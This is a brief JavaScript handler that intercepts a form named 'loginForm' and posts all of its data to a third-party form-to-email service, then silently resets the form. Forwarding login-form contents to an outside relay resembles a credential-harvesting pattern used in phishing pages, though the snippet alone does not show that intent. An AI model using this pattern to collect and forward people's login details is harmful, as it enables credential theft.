const form = document.getElementById('loginForm');
const result = document.getElementById('result');

form.addEventListener('submit', async (e) => {
  e.preventDefault(); // stop page reload

  result.textContent = "";

  const formData = new FormData(form);
  
  const response = await fetch("https://api.web3forms.com/submit", {
    method: "POST",
    body: formData
  });

  const data = await response.json();

  if (data.success) {
    result.textContent = "";
    form.reset(); // clear form
  } else {
    result.textContent = "❌ Something went wrong. Try again.";
  }
});